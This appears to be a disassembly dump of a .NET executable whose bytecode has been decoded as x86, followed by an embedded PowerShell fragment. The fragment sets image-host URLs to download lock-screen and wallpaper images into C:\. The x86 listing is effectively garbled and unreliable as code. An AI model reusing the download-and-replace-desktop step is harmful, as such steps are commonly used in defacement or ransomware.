  40453e:	f6 00 00             	testb  $0x0,(%eax)
  404541:	0a 25 13 07 2d ed    	or     0xed2d0713,%ah
  404547:	11 06                	adc    %eax,(%esi)
  404549:	6f                   	outsl  %ds:(%esi),(%dx)
  40454a:	f7 00 00 0a 73 f8    	testl  $0xf8730a00,(%eax)
  404550:	00 00                	add    %al,(%eax)
  404552:	0a 13                	or     (%ebx),%dl
  404554:	08 11                	or     %dl,(%ecx)
  404556:	08 11                	or     %dl,(%ecx)
  404558:	17                   	pop    %ss
  404559:	2d 0f 11 19 fe       	sub    $0xfe19110f,%eax
  40455e:	06                   	push   %es
  40455f:	7c 00                	jl     0x404561
  404561:	00 06                	add    %al,(%esi)
  404563:	73 f2                	jae    0x404557
  404565:	00 00                	add    %al,(%eax)
  404567:	0a 13                	or     (%ebx),%dl
  404569:	17                   	pop    %ss
  40456a:	11 17                	adc    %edx,(%edi)
  40456c:	6f                   	outsl  %ds:(%esi),(%dx)
  40456d:	f9                   	stc
  40456e:	00 00                	add    %al,(%eax)
  404570:	0a 16                	or     (%esi),%dl
  404572:	13 09                	adc    (%ecx),%ecx
  404574:	16                   	push   %ss
  404575:	13 0a                	adc    (%edx),%ecx
  404577:	02 13                	add    (%ebx),%dl
  404579:	1b 16                	sbb    (%esi),%edx
  40457b:	13 1c 38             	adc    (%eax,%edi,1),%ebx
  40457e:	c7 00 00 00 11 1b    	movl   $0x1b110000,(%eax)
  404584:	11 1c 9a             	adc    %ebx,(%edx,%ebx,4)
  404587:	13 0b                	adc    (%ebx),%ecx
  404589:	11 0b                	adc    %ecx,(%ebx)
  40458b:	72 7b                	jb     0x404608
  40458d:	02 00                	add    (%eax),%al
  40458f:	70 17                	jo     0x4045a8
  404591:	28 fa                	sub    %bh,%dl
  404593:	00 00                	add    %al,(%eax)
  404595:	0a 2d 07 17 0b 38    	or     0x380b1707,%ch
  40459b:	9e                   	sahf
  40459c:	00 00                	add    %al,(%eax)
  40459e:	00 11                	add    %dl,(%ecx)
  4045a0:	0b 72 87             	or     -0x79(%edx),%esi
  4045a3:	02 00                	add    (%eax),%al
  4045a5:	70 19                	jo     0x4045c0
  4045a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4045a8:	fb                   	sti
  4045a9:	00 00                	add    %al,(%eax)
  4045ab:	0a 2c 61             	or     (%ecx,%eiz,2),%ch
  4045ae:	11 0b                	adc    %ecx,(%ebx)
  4045b0:	17                   	pop    %ss
  4045b1:	8d 33                	lea    (%ebx),%esi
  4045b3:	00 00                	add    %al,(%eax)
  4045b5:	01 13                	add    %edx,(%ebx)
  4045b7:	1d 11 1d 16 72       	sbb    $0x72161d11,%eax
  4045bc:	99                   	cltd
  4045bd:	02 00                	add    (%eax),%al
  4045bf:	70 a2                	jo     0x404563
  4045c1:	11 1d 18 17 6f fc    	adc    %ebx,0xfc6f1718
  4045c7:	00 00                	add    %al,(%eax)
  4045c9:	0a 13                	or     (%ebx),%dl
  4045cb:	0c 11                	or     $0x11,%al
  4045cd:	0c 8e                	or     $0x8e,%al
  4045cf:	69 18 2e 20 72 9d    	imul   $0x9d72202e,(%eax),%ebx
  4045d5:	02 00                	add    (%eax),%al
  4045d7:	70 28                	jo     0x404601
  4045d9:	27                   	daa
  4045da:	00 00                	add    %al,(%eax)
  4045dc:	0a 6f 28             	or     0x28(%edi),%ch
  4045df:	00 00                	add    %al,(%eax)
  4045e1:	0a 16                	or     (%esi),%dl
  4045e3:	1f                   	pop    %ds
  4045e4:	10 28                	adc    %ch,(%eax)
  4045e6:	fd                   	std
  4045e7:	00 00                	add    %al,(%eax)
  4045e9:	0a 26                	or     (%esi),%ah
  4045eb:	17                   	pop    %ss
  4045ec:	13 1a                	adc    (%edx),%ebx
  4045ee:	dd 78 03             	fnstsw 0x3(%eax)
  4045f1:	00 00                	add    %al,(%eax)
  4045f3:	11 0c 17             	adc    %ecx,(%edi,%edx,1)
  4045f6:	9a 17 8d 62 00 00 01 	lcall  $0x100,$0x628d17
  4045fd:	13 1e                	adc    (%esi),%ebx
  4045ff:	11 1e                	adc    %ebx,(%esi)
  404601:	16                   	push   %ss
  404602:	1f                   	pop    %ds
  404603:	22 9d 11 1e 6f fe    	and    -0x190e1ef(%ebp),%bl
  404609:	00 00                	add    %al,(%eax)
  40460b:	0a 0c 2b             	or     (%ebx,%ebp,1),%cl
  40460e:	2e 11 0b             	adc    %ecx,%cs:(%ebx)
  404611:	72 7c                	jb     0x40468f
  404613:	03 00                	add    (%eax),%eax
  404615:	70 17                	jo     0x40462e
  404617:	28 fa                	sub    %bh,%dl
  404619:	00 00                	add    %al,(%eax)
  40461b:	0a 2d 08 11 0a 17    	or     0x170a1108,%ch
  404621:	58                   	pop    %eax
  404622:	13 09                	adc    (%ecx),%ecx
  404624:	2b 2e                	sub    (%esi),%ebp
  404626:	11 0b                	adc    %ecx,(%ebx)
  404628:	72 86                	jb     0x4045b0
  40462a:	03 00                	add    (%eax),%eax
  40462c:	70 17                	jo     0x404645
  40462e:	28 fa                	sub    %bh,%dl
  404630:	00 00                	add    %al,(%eax)
  404632:	0a 2d 08 28 ff 00    	or     0xff2808,%ch
  404638:	00 0a                	add    %cl,(%edx)
  40463a:	26 2b 17             	sub    %es:(%edi),%edx
  40463d:	11 0a                	adc    %ecx,(%edx)
  40463f:	17                   	pop    %ss
  404640:	58                   	pop    %eax
  404641:	13 0a                	adc    (%edx),%ecx
  404643:	11 1c 17             	adc    %ebx,(%edi,%edx,1)
  404646:	58                   	pop    %eax
  404647:	13 1c 11             	adc    (%ecx,%edx,1),%ebx
  40464a:	1c 11                	sbb    $0x11,%al
  40464c:	1b 8e 69 3f 2e ff    	sbb    -0xd1c097(%esi),%ecx
  404652:	ff                   	(bad)
  404653:	ff 28                	ljmp   *(%eax)
  404655:	46                   	inc    %esi
  404656:	00 00                	add    %al,(%eax)
  404658:	0a 13                	or     (%ebx),%dl
  40465a:	0d 11 0d 72 94       	or     $0x94720d11,%eax
  40465f:	03 00                	add    (%eax),%eax
  404661:	70 6f                	jo     0x4046d2
  404663:	00 01                	add    %al,(%ecx)
  404665:	00 0a                	add    %cl,(%edx)
  404667:	13 0e                	adc    (%esi),%ecx
  404669:	11 0e                	adc    %ecx,(%esi)
  40466b:	28 01                	sub    %al,(%ecx)
  40466d:	01 00                	add    %eax,(%eax)
  40466f:	0a 73 02             	or     0x2(%ebx),%dh
  404672:	01 00                	add    %eax,(%eax)
  404674:	0a 13                	or     (%ebx),%dl
  404676:	0f 11 0f             	movups %xmm1,(%edi)
  404679:	6f                   	outsl  %ds:(%esi),(%dx)
  40467a:	03 01                	add    (%ecx),%eax
  40467c:	00 0a                	add    %cl,(%edx)
  40467e:	13 10                	adc    (%eax),%edx
  404680:	08 28                	or     %ch,(%eax)
  404682:	0d 00 00 0a 2d       	or     $0x2d0a0000,%eax
  404687:	10 08                	adc    %cl,(%eax)
  404689:	11 10                	adc    %edx,(%eax)
  40468b:	28 04 01             	sub    %al,(%ecx,%eax,1)
  40468e:	00 0a                	add    %cl,(%edx)
  404690:	16                   	push   %ss
  404691:	13 1a                	adc    (%edx),%ebx
  404693:	dd d3                	fst    %st(3)
  404695:	02 00                	add    (%eax),%al
  404697:	00 11                	add    %dl,(%ecx)
  404699:	05 11 10 6f 05       	add    $0x56f1011,%eax
  40469e:	01 00                	add    %eax,(%eax)
  4046a0:	0a 26                	or     (%esi),%ah
  4046a2:	de 0c 11             	fimuls (%ecx,%edx,1)
  4046a5:	0f 2c 07             	cvttps2pi (%edi),%mm0
  4046a8:	11 0f                	adc    %ecx,(%edi)
  4046aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4046ab:	5e                   	pop    %esi
  4046ac:	00 00                	add    %al,(%eax)
  4046ae:	0a dc                	or     %ah,%bl
  4046b0:	de 0c 11             	fimuls (%ecx,%edx,1)
  4046b3:	0e                   	push   %cs
  4046b4:	2c 07                	sub    $0x7,%al
  4046b6:	11 0e                	adc    %ecx,(%esi)
  4046b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4046b9:	5e                   	pop    %esi
  4046ba:	00 00                	add    %al,(%eax)
  4046bc:	0a dc                	or     %ah,%bl
  4046be:	14 13                	adc    $0x13,%al
  4046c0:	11 72 ae             	adc    %esi,-0x52(%edx)
  4046c3:	03 00                	add    (%eax),%eax
  4046c5:	70 73                	jo     0x40473a
  4046c7:	06                   	push   %es
  4046c8:	01 00                	add    %eax,(%eax)
  4046ca:	0a 13                	or     (%ebx),%dl
  4046cc:	12 11                	adc    (%ecx),%dl
  4046ce:	09 13                	or     %edx,(%ebx)
  4046d0:	13 38                	adc    (%eax),%edi
  4046d2:	ae                   	scas   %es:(%edi),%al
  4046d3:	01 00                	add    %eax,(%eax)
  4046d5:	00 11                	add    %dl,(%ecx)
  4046d7:	12 02                	adc    (%edx),%al
  4046d9:	11 13                	adc    %edx,(%ebx)
  4046db:	9a 6f 07 01 00 0a 13 	lcall  $0x130a,$0x1076f
  4046e2:	14 11                	adc    $0x11,%al
  4046e4:	14 6f                	adc    $0x6f,%al
  4046e6:	08 01                	or     %al,(%ecx)
  4046e8:	00 0a                	add    %cl,(%edx)
  4046ea:	39 6c 01 00          	cmp    %ebp,0x0(%ecx,%eax,1)
  4046ee:	00 11                	add    %dl,(%ecx)
  4046f0:	14 6f                	adc    $0x6f,%al
  4046f2:	09 01                	or     %eax,(%ecx)
  4046f4:	00 0a                	add    %cl,(%edx)
  4046f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4046f7:	0a 01                	or     (%ecx),%al
  4046f9:	00 0a                	add    %cl,(%edx)
  4046fb:	19 40 5a             	sbb    %eax,0x5a(%eax)
  4046fe:	01 00                	add    %eax,(%eax)
  404700:	00 02                	add    %al,(%edx)
  404702:	11 13                	adc    %edx,(%ebx)
  404704:	9a 12 15 28 0b 01 00 	lcall  $0x1,$0xb281512
  40470b:	0a 3a                	or     (%edx),%bh
  40470d:	4a                   	dec    %edx
  40470e:	01 00                	add    %eax,(%eax)
  404710:	00 11                	add    %dl,(%ecx)
  404712:	11 2c 0a             	adc    %ebp,(%edx,%ecx,1)
  404715:	11 05 11 11 6f 0c    	adc    %eax,0xc6f1111
  40471b:	01 00                	add    %eax,(%eax)
  40471d:	0a 26                	or     (%esi),%ah
  40471f:	11 14 6f             	adc    %edx,(%edi,%ebp,2)
  404722:	09 01                	or     %eax,(%ecx)
  404724:	00 0a                	add    %cl,(%edx)
  404726:	18 6f 0d             	sbb    %ch,0xd(%edi)
  404729:	01 00                	add    %eax,(%eax)
  40472b:	0a 6f 0e             	or     0xe(%edi),%ch
  40472e:	01 00                	add    %eax,(%eax)
  404730:	0a 6f 0f             	or     0xf(%edi),%ch
  404733:	01 00                	add    %eax,(%eax)
  404735:	0a 72 01             	or     0x1(%edx),%dh
  404738:	00 00                	add    %al,(%eax)
  40473a:	70 28                	jo     0x404764
  40473c:	c3                   	ret
  40473d:	00 00                	add    %al,(%eax)
  40473f:	0a 2c 19             	or     (%ecx,%ebx,1),%ch
  404742:	11 14 6f             	adc    %edx,(%edi,%ebp,2)
  404745:	09 01                	or     %eax,(%ecx)
  404747:	00 0a                	add    %cl,(%edx)
  404749:	17                   	pop    %ss
  40474a:	6f                   	outsl  %ds:(%esi),(%dx)
  40474b:	0d 01 00 0a 6f       	or     $0x6f0a0001,%eax
  404750:	0e                   	push   %cs
  404751:	01 00                	add    %eax,(%eax)
  404753:	0a 13                	or     (%ebx),%dl
  404755:	11 38                	adc    %edi,(%eax)
  404757:	23 01                	and    (%ecx),%eax
  404759:	00 00                	add    %al,(%eax)
  40475b:	11 14 6f             	adc    %edx,(%edi,%ebp,2)
  40475e:	09 01                	or     %eax,(%ecx)
  404760:	00 0a                	add    %cl,(%edx)
  404762:	18 6f 0d             	sbb    %ch,0xd(%edi)
  404765:	01 00                	add    %eax,(%eax)
  404767:	0a 6f 0e             	or     0xe(%edi),%ch
  40476a:	01 00                	add    %eax,(%eax)
  40476c:	0a 72 de             	or     -0x22(%edx),%dh
  40476f:	03 00                	add    (%eax),%eax
  404771:	70 28                	jo     0x40479b
  404773:	c3                   	ret
  404774:	00 00                	add    %al,(%eax)
  404776:	0a 2d 23 11 14 6f    	or     0x6f141123,%ch
  40477c:	09 01                	or     %eax,(%ecx)
  40477e:	00 0a                	add    %cl,(%edx)
  404780:	18 6f 0d             	sbb    %ch,0xd(%edi)
  404783:	01 00                	add    %eax,(%eax)
  404785:	0a 6f 0e             	or     0xe(%edi),%ch
  404788:	01 00                	add    %eax,(%eax)
  40478a:	0a 6f 10             	or     0x10(%edi),%ch
  40478d:	01 00                	add    %eax,(%eax)
  40478f:	0a 72 e8             	or     -0x18(%edx),%dh
  404792:	03 00                	add    (%eax),%eax
  404794:	70 28                	jo     0x4047be
  404796:	c3                   	ret
  404797:	00 00                	add    %al,(%eax)
  404799:	0a 2c 28             	or     (%eax,%ebp,1),%ch
  40479c:	11 05 11 14 6f 09    	adc    %eax,0x96f1411
  4047a2:	01 00                	add    %eax,(%eax)
  4047a4:	0a 17                	or     (%edi),%dl
  4047a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4047a7:	0d 01 00 0a 6f       	or     $0x6f0a0001,%eax
  4047ac:	0e                   	push   %cs
  4047ad:	01 00                	add    %eax,(%eax)
  4047af:	0a 17                	or     (%edi),%dl
  4047b1:	8c 8d 00 00 01 6f    	mov    %cs,0x6f010000(%ebp)
  4047b7:	11 01                	adc    %eax,(%ecx)
  4047b9:	00 0a                	add    %cl,(%edx)
  4047bb:	26 14 13             	es adc $0x13,%al
  4047be:	11 38                	adc    %edi,(%eax)
  4047c0:	ba 00 00 00 11       	mov    $0x11000000,%edx
  4047c5:	14 6f                	adc    $0x6f,%al
  4047c7:	09 01                	or     %eax,(%ecx)
  4047c9:	00 0a                	add    %cl,(%edx)
  4047cb:	18 6f 0d             	sbb    %ch,0xd(%edi)
  4047ce:	01 00                	add    %eax,(%eax)
  4047d0:	0a 6f 0e             	or     0xe(%edi),%ch
  4047d3:	01 00                	add    %eax,(%eax)
  4047d5:	0a 72 f4             	or     -0xc(%edx),%dh
  4047d8:	03 00                	add    (%eax),%eax
  4047da:	70 28                	jo     0x404804
  4047dc:	c3                   	ret
  4047dd:	00 00                	add    %al,(%eax)
  4047df:	0a 2d 23 11 14 6f    	or     0x6f141123,%ch
  4047e5:	09 01                	or     %eax,(%ecx)
  4047e7:	00 0a                	add    %cl,(%edx)
  4047e9:	18 6f 0d             	sbb    %ch,0xd(%edi)
  4047ec:	01 00                	add    %eax,(%eax)
  4047ee:	0a 6f 0e             	or     0xe(%edi),%ch
  4047f1:	01 00                	add    %eax,(%eax)
  4047f3:	0a 6f 10             	or     0x10(%edi),%ch
  4047f6:	01 00                	add    %eax,(%eax)
  4047f8:	0a 72 00             	or     0x0(%edx),%dh
  4047fb:	04 00                	add    $0x0,%al
  4047fd:	70 28                	jo     0x404827
  4047ff:	c3                   	ret
  404800:	00 00                	add    %al,(%eax)
  404802:	0a 2c 25 11 05 11 14 	or     0x14110511(,%eiz,1),%ch
  404809:	6f                   	outsl  %ds:(%esi),(%dx)
  40480a:	09 01                	or     %eax,(%ecx)
  40480c:	00 0a                	add    %cl,(%edx)
  40480e:	17                   	pop    %ss
  40480f:	6f                   	outsl  %ds:(%esi),(%dx)
  404810:	0d 01 00 0a 6f       	or     $0x6f0a0001,%eax
  404815:	0e                   	push   %cs
  404816:	01 00                	add    %eax,(%eax)
  404818:	0a 16                	or     (%esi),%dl
  40481a:	8c 8d 00 00 01 6f    	mov    %cs,0x6f010000(%ebp)
  404820:	11 01                	adc    %eax,(%ecx)
  404822:	00 0a                	add    %cl,(%edx)
  404824:	26 14 13             	es adc $0x13,%al
  404827:	11 2b                	adc    %ebp,(%ebx)
  404829:	54                   	push   %esp
  40482a:	11 05 11 14 6f 09    	adc    %eax,0x96f1411
  404830:	01 00                	add    %eax,(%eax)
  404832:	0a 17                	or     (%edi),%dl
  404834:	6f                   	outsl  %ds:(%esi),(%dx)
  404835:	0d 01 00 0a 6f       	or     $0x6f0a0001,%eax
  40483a:	0e                   	push   %cs
  40483b:	01 00                	add    %eax,(%eax)
  40483d:	0a 11                	or     (%ecx),%dl
  40483f:	14 6f                	adc    $0x6f,%al
  404841:	09 01                	or     %eax,(%ecx)
  404843:	00 0a                	add    %cl,(%edx)
  404845:	18 6f 0d             	sbb    %ch,0xd(%edi)
  404848:	01 00                	add    %eax,(%eax)
  40484a:	0a 6f 0e             	or     0xe(%edi),%ch
  40484d:	01 00                	add    %eax,(%eax)
  40484f:	0a 6f 11             	or     0x11(%edi),%ch
  404852:	01 00                	add    %eax,(%eax)
  404854:	0a 26                	or     (%esi),%ah
  404856:	14 13                	adc    $0x13,%al
  404858:	11 2b                	adc    %ebp,(%ebx)
  40485a:	23 11                	and    (%ecx),%edx
  40485c:	11 2c 13             	adc    %ebp,(%ebx,%edx,1)
  40485f:	11 05 11 11 02 11    	adc    %eax,0x11021111
  404865:	13 9a 6f 11 01 00    	adc    0x1116f(%edx),%ebx
  40486b:	0a 26                	or     (%esi),%ah
  40486d:	14 13                	adc    $0x13,%al
  40486f:	11 2b                	adc    %ebp,(%ebx)
  404871:	0c 11                	or     $0x11,%al
  404873:	05 02 11 13 9a       	add    $0x9a131102,%eax
  404878:	6f                   	outsl  %ds:(%esi),(%dx)
  404879:	12 01                	adc    (%ecx),%al
  40487b:	00 0a                	add    %cl,(%edx)
  40487d:	26 11 13             	adc    %edx,%es:(%ebx)
  404880:	17                   	pop    %ss
  404881:	58                   	pop    %eax
  404882:	13 13                	adc    (%ebx),%edx
  404884:	11 13                	adc    %edx,(%ebx)
  404886:	02 8e 69 3f 48 fe    	add    -0x1b7c097(%esi),%cl
  40488c:	ff                   	(bad)
  40488d:	ff 11                	call   *(%ecx)
  40488f:	11 2c 0a             	adc    %ebp,(%edx,%ecx,1)
  404892:	11 05 11 11 6f 0c    	adc    %eax,0xc6f1111
  404898:	01 00                	add    %eax,(%eax)
  40489a:	0a 26                	or     (%esi),%ah
  40489c:	11 05 72 0e 04 00    	adc    %eax,0x40e72
  4048a2:	70 6f                	jo     0x404913
  4048a4:	13 01                	adc    (%ecx),%eax
  4048a6:	00 0a                	add    %cl,(%edx)
  4048a8:	26 11 05 72 24 04 00 	adc    %eax,%es:0x42472
  4048af:	70 6f                	jo     0x404920
  4048b1:	0c 01                	or     $0x1,%al
  4048b3:	00 0a                	add    %cl,(%edx)
  4048b5:	26 11 05 11 06 11 08 	adc    %eax,%es:0x8110611
  4048bc:	14 11                	adc    $0x11,%al
  4048be:	18 2d 0f 11 19 fe    	sbb    %ch,0xfe19110f
  4048c4:	06                   	push   %es
  4048c5:	7d 00                	jge    0x4048c7
  4048c7:	00 06                	add    %al,(%esi)
  4048c9:	73 14                	jae    0x4048df
  4048cb:	01 00                	add    %eax,(%eax)
  4048cd:	0a 13                	or     (%ebx),%dl
  4048cf:	18 11                	sbb    %dl,(%ecx)
  4048d1:	18 14 6f             	sbb    %dl,(%edi,%ebp,2)
  4048d4:	02 00                	add    (%eax),%al
  4048d6:	00 2b                	add    %ch,(%ebx)
  4048d8:	26 06                	es push %es
  4048da:	6f                   	outsl  %ds:(%esi),(%dx)
  4048db:	73 00                	jae    0x4048dd
  4048dd:	00 06                	add    %al,(%esi)
  4048df:	2d 10 11 19 7b       	sub    $0x7b191110,%eax
  4048e4:	59                   	pop    %ecx
  4048e5:	00 00                	add    %al,(%eax)
  4048e7:	04 1f                	add    $0x1f,%al
  4048e9:	64 6f                	outsl  %fs:(%esi),(%dx)
  4048eb:	16                   	push   %ss
  4048ec:	01 00                	add    %eax,(%eax)
  4048ee:	0a 2c e8             	or     (%eax,%ebp,8),%ch
  4048f1:	11 05 6f 17 01 00    	adc    %eax,0x1176f
  4048f7:	0a 11                	or     (%ecx),%dl
  4048f9:	05 6f 18 01 00       	add    $0x1186f,%eax
  4048fe:	0a 6f 19             	or     0x19(%edi),%ch
  404901:	01 00                	add    %eax,(%eax)
  404903:	0a 1b                	or     (%ebx),%bl
  404905:	33 1d 11 19 7b 58    	xor    0x587b1911,%ebx
  40490b:	00 00                	add    %al,(%eax)
  40490d:	04 11                	add    $0x11,%al
  40490f:	05 6f 18 01 00       	add    $0x1186f,%eax
  404914:	0a 6f 1a             	or     0x1a(%edi),%ch
  404917:	01 00                	add    %eax,(%eax)
  404919:	0a 6f e2             	or     -0x1e(%edi),%ch
  40491c:	00 00                	add    %al,(%eax)
  40491e:	0a 6f e3             	or     -0x1d(%edi),%ch
  404921:	00 00                	add    %al,(%eax)
  404923:	0a de                	or     %dh,%bl
  404925:	0c 11                	or     $0x11,%al
  404927:	05 2c 07 11 05       	add    $0x511072c,%eax
  40492c:	6f                   	outsl  %ds:(%esi),(%dx)
  40492d:	5e                   	pop    %esi
  40492e:	00 00                	add    %al,(%eax)
  404930:	0a dc                	or     %ah,%bl
  404932:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  404935:	1b 01                	sbb    (%ecx),%eax
  404937:	00 0a                	add    %cl,(%edx)
  404939:	de 0c 11             	fimuls (%ecx,%edx,1)
  40493c:	04 2c                	add    $0x2c,%al
  40493e:	07                   	pop    %es
  40493f:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  404942:	5e                   	pop    %esi
  404943:	00 00                	add    %al,(%eax)
  404945:	0a dc                	or     %ah,%bl
  404947:	de 03                	fiadds (%ebx)
  404949:	26 de 00             	fiadds %es:(%eax)
  40494c:	07                   	pop    %es
  40494d:	2c 15                	sub    $0x15,%al
  40494f:	72 32                	jb     0x404983
  404951:	04 00                	add    $0x0,%al
  404953:	70 28                	jo     0x40497d
  404955:	27                   	daa
  404956:	00 00                	add    %al,(%eax)
  404958:	0a 6f 28             	or     0x28(%edi),%ch
  40495b:	00 00                	add    %al,(%eax)
  40495d:	0a 28                	or     (%eax),%ch
  40495f:	aa                   	stos   %al,%es:(%edi)
  404960:	00 00                	add    %al,(%eax)
  404962:	0a 26                	or     (%esi),%ah
  404964:	06                   	push   %es
  404965:	6f                   	outsl  %ds:(%esi),(%dx)
  404966:	75 00                	jne    0x404968
  404968:	00 06                	add    %al,(%esi)
  40496a:	2a 11                	sub    (%ecx),%dl
  40496c:	1a 2a                	sbb    (%edx),%ch
  40496e:	00 00                	add    %al,(%eax)
  404970:	41                   	inc    %ecx
  404971:	7c 00                	jl     0x404973
  404973:	00 02                	add    %al,(%edx)
  404975:	00 00                	add    %al,(%eax)
  404977:	00 07                	add    %al,(%edi)
  404979:	02 00                	add    (%eax),%al
  40497b:	00 2d 00 00 00 34    	add    %ch,0x34000000
  404981:	02 00                	add    (%eax),%al
  404983:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404986:	00 00                	add    %al,(%eax)
  404988:	00 00                	add    %al,(%eax)
  40498a:	00 00                	add    %al,(%eax)
  40498c:	02 00                	add    (%eax),%al
  40498e:	00 00                	add    %al,(%eax)
  404990:	f9                   	stc
  404991:	01 00                	add    %eax,(%eax)
  404993:	00 49 00             	add    %cl,0x0(%ecx)
  404996:	00 00                	add    %al,(%eax)
  404998:	42                   	inc    %edx
  404999:	02 00                	add    (%eax),%al
  40499b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40499e:	00 00                	add    %al,(%eax)
  4049a0:	00 00                	add    %al,(%eax)
  4049a2:	00 00                	add    %al,(%eax)
  4049a4:	02 00                	add    (%eax),%al
  4049a6:	00 00                	add    %al,(%eax)
  4049a8:	7e 00                	jle    0x4049aa
  4049aa:	00 00                	add    %al,(%eax)
  4049ac:	38 04 00             	cmp    %al,(%eax,%eax,1)
  4049af:	00 b6 04 00 00 0c    	add    %dh,0xc000004(%esi)
  4049b5:	00 00                	add    %al,(%eax)
  4049b7:	00 00                	add    %al,(%eax)
  4049b9:	00 00                	add    %al,(%eax)
  4049bb:	00 02                	add    %al,(%edx)
  4049bd:	00 00                	add    %al,(%eax)
  4049bf:	00 68 00             	add    %ch,0x0(%eax)
  4049c2:	00 00                	add    %al,(%eax)
  4049c4:	63 04 00             	arpl   %eax,(%eax,%eax,1)
  4049c7:	00 cb                	add    %cl,%bl
  4049c9:	04 00                	add    $0x0,%al
  4049cb:	00 0c 00             	add    %cl,(%eax,%eax,1)
	...
  4049d6:	00 00                	add    %al,(%eax)
  4049d8:	60                   	pusha
  4049d9:	00 00                	add    %al,(%eax)
  4049db:	00 79 04             	add    %bh,0x4(%ecx)
  4049de:	00 00                	add    %al,(%eax)
  4049e0:	d9 04 00             	flds   (%eax,%eax,1)
  4049e3:	00 03                	add    %al,(%ebx)
  4049e5:	00 00                	add    %al,(%eax)
  4049e7:	00 69 00             	add    %ch,0x0(%ecx)
  4049ea:	00 01                	add    %al,(%ecx)
  4049ec:	6a 72                	push   $0x72
  4049ee:	5a                   	pop    %edx
  4049ef:	04 00                	add    $0x0,%al
  4049f1:	70 28                	jo     0x404a1b
  4049f3:	27                   	daa
  4049f4:	00 00                	add    %al,(%eax)
  4049f6:	0a 6f 28             	or     0x28(%edi),%ch
  4049f9:	00 00                	add    %al,(%eax)
  4049fb:	0a 28                	or     (%eax),%ch
  4049fd:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4049fe:	00 00                	add    %al,(%eax)
  404a00:	0a 73 1c             	or     0x1c(%ebx),%dh
  404a03:	01 00                	add    %eax,(%eax)
  404a05:	0a 7a 1e             	or     0x1e(%edx),%bh
  404a08:	02 28                	add    (%eax),%ch
  404a0a:	11 00                	adc    %eax,(%eax)
  404a0c:	00 0a                	add    %cl,(%edx)
  404a0e:	2a 00                	sub    (%eax),%al
  404a10:	c4 0a                	les    (%edx),%ecx
  404a12:	00 00                	add    %al,(%eax)
  404a14:	24 6c                	and    $0x6c,%al
  404a16:	6f                   	outsl  %ds:(%esi),(%dx)
  404a17:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  404a1a:	6d                   	insl   (%dx),%es:(%edi)
  404a1b:	61                   	popa
  404a1c:	67 65 55             	addr16 gs push %ebp
  404a1f:	72 6c                	jb     0x404a8d
  404a21:	20 3d 20 22 68 74    	and    %bh,0x74682220
  404a27:	74 70                	je     0x404a99
  404a29:	73 3a                	jae    0x404a65
  404a2b:	2f                   	das
  404a2c:	2f                   	das
  404a2d:	69 2e 69 62 62 2e    	imul   $0x2e626269,(%esi),%ebp
  404a33:	63 6f 2f             	arpl   %ebp,0x2f(%edi)
  404a36:	44                   	inc    %esp
  404a37:	50                   	push   %eax
  404a38:	78 44                	js     0x404a7e
  404a3a:	4c                   	dec    %esp
  404a3b:	68 59 56 2f 6c       	push   $0x6c2f5659
  404a40:	6f                   	outsl  %ds:(%esi),(%dx)
  404a41:	63 6b 73             	arpl   %ebp,0x73(%ebx)
  404a44:	63 72 65             	arpl   %esi,0x65(%edx)
  404a47:	65 6e                	outsb  %gs:(%esi),(%dx)
  404a49:	2e 6a 70             	cs push $0x70
  404a4c:	67 22 0d             	and    (%di),%cl
  404a4f:	0a 24 6c             	or     (%esp,%ebp,2),%ah
  404a52:	6f                   	outsl  %ds:(%esi),(%dx)
  404a53:	63 6b 64             	arpl   %ebp,0x64(%ebx)
  404a56:	65 73 74             	gs jae 0x404acd
  404a59:	69 6e 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%esi),%ebp
  404a60:	50                   	push   %eax
  404a61:	61                   	popa
  404a62:	74 68                	je     0x404acc
  404a64:	20 3d 20 22 43 3a    	and    %bh,0x3a432220
  404a6a:	5c                   	pop    %esp
  404a6b:	6c                   	insb   (%dx),%es:(%edi)
  404a6c:	6f                   	outsl  %ds:(%esi),(%dx)
  404a6d:	63 6b 73             	arpl   %ebp,0x73(%ebx)
  404a70:	63 72 65             	arpl   %esi,0x65(%edx)
  404a73:	65 6e                	outsb  %gs:(%esi),(%dx)
  404a75:	2e 6a 70             	cs push $0x70
  404a78:	67 22 20             	and    (%bx,%si),%ah
  404a7b:	0d 0a 0d 0a 24       	or     $0x240a0d0a,%eax
  404a80:	77 61                	ja     0x404ae3
  404a82:	6c                   	insb   (%dx),%es:(%edi)
  404a83:	6c                   	insb   (%dx),%es:(%edi)
  404a84:	69 6d 61 67 65 55 72 	imul   $0x72556567,0x61(%ebp),%ebp
  404a8b:	6c                   	insb   (%dx),%es:(%edi)
  404a8c:	20 3d 20 22 68 74    	and    %bh,0x74682220
  404a92:	74 70                	je     0x404b04
  404a94:	73 3a                	jae    0x404ad0
  404a96:	2f                   	das
  404a97:	2f                   	das
  404a98:	69 2e 69 62 62 2e    	imul   $0x2e626269,(%esi),%ebp
  404a9e:	63 6f 2f             	arpl   %ebp,0x2f(%edi)
  404aa1:	6a 39                	push   $0x39
  404aa3:	64 43                	fs inc %ebx
  404aa5:	4b                   	dec    %ebx
  404aa6:	62 64 35 2f          	bound  %esp,0x2f(%ebp,%esi,1)
  404aaa:	77 61                	ja     0x404b0d
  404aac:	6c                   	insb   (%dx),%es:(%edi)
  404aad:	6c                   	insb   (%dx),%es:(%edi)
  404aae:	70 61                	jo     0x404b11
  404ab0:	70 65                	jo     0x404b17
  404ab2:	72 2e                	jb     0x404ae2
  404ab4:	6a 70                	push   $0x70
  404ab6:	67 22 0d             	and    (%di),%cl
  404ab9:	0a 24 77             	or     (%edi,%esi,2),%ah
  404abc:	61                   	popa
  404abd:	6c                   	insb   (%dx),%es:(%edi)
  404abe:	6c                   	insb   (%dx),%es:(%edi)
  404abf:	64 65 73 74          	fs gs jae 0x404b37
  404ac3:	69 6e 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%esi),%ebp
  404aca:	50                   	push   %eax
  404acb:	61                   	popa
  404acc:	74 68                	je     0x404b36
  404ace:	20 3d 20 22 43 3a    	and    %bh,0x3a432220
